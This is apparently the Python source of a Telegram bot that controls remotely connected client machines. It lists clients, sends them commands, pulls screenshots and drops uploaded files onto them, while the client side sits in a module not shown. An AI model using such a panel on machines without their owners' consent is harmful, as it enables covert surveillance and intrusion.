"""
Телеграм интерфейс для управления системкой
"""

import threading
import os

from server import ManyServers, help_command
import config as config
import asyncio

import logging


from aiogram import Bot, Dispatcher, executor, types

API_TOKEN = config.TELEGRAM_TOKEN

mult = ManyServers()

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['clients'])
async def view_all_clients(message: types.Message):
    """показывает список доступных подключений"""
    await message.answer(mult.view_all_servers())

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    """обработка команды start"""
    await message.answer("Интерфейс для управления системкой")

@dp.message_handler(commands=['help'])
async def help(message: types.Message):
    """обработка команды help"""
    await message.answer(help_command())

@dp.message_handler(commands=['client'])
async def client(message: types.Message):
    """Создание запроса к клиенту"""
    try:
        # обрезает команду /client
        message.text = message.get_args()
        res = await mult.make_command_to_server(message.text)
        if res is None:
            await message.answer("Nothing")
        if type(res) != str:
            try:
                if res[0] == "screen":
                    await message.answer_document(open("screen.png", "rb"))
                    os.remove("screen.png")
            except Exception as err:
                print(err)
            else:
                for i in res[1:]:
                    await message.answer(i)        
        else:
            await message.answer(res)
    except Exception as err:
        print(err)
        await message.reply("ошибка при выполнении команды")

@dp.message_handler(content_types="document")
async def client(message:types.Message):
    if message.caption == "":
        await message.reply("необходимо указать тег клиента")
    else:
        name = message.document.file_name
        await message.document.download(destination_file=name)
        res = await mult.make_command_to_server(message.caption + " drop " + name)
        os.remove(name)
        await message.answer(res)

def connection_monitor():
    """Мониторинг новых подключений"""
    # p = Process(target=mult.add_connection)
    # p.start()
    t = threading.Thread(target=(mult.add_connection), daemon=True)
    t.start()

def main():
    """main"""
    loop = asyncio.get_event_loop()
    loop.create_server(ManyServers.add_connection)
    # loop.create_server(ManyServers.view_all_servers)
    loop.create_server(ManyServers.make_command_to_server)
    connection_monitor()
    try:
        executor.start_polling(dp, skip_updates=True)
    except Exception as er:
        print(er)
        input()

if __name__ == '__main__':
    main()
